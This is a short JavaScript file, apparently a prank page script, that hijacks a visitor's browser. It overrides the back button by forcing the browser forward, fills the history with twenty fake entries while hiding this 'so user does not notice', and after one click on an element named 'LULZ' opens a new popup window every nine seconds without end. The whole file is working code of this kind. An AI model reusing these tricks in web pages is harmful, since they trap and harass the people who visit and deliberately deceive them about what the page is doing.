function blockBackButton () {
  window.addEventListener('popstate', () => {
    window.history.forward()
  })
}

function fillHistory () {
  for (let i = 1; i < 20; i++) {
    window.history.pushState({}, '', window.location.pathname + '?q=' + i)
  }
  // Set location back to the initial location, so user does not notice
  window.history.pushState({}, '', window.location.pathname)
}

blockBackButton()
fillHistory()

document.getElementById("LULZ").addEventListener('click', e => {
  document.getElementById("LULZ").remove();
  setInterval(function(){
    window.open("popup.html","","left=100,top=100,width=220,height=240");
  },9000);
})
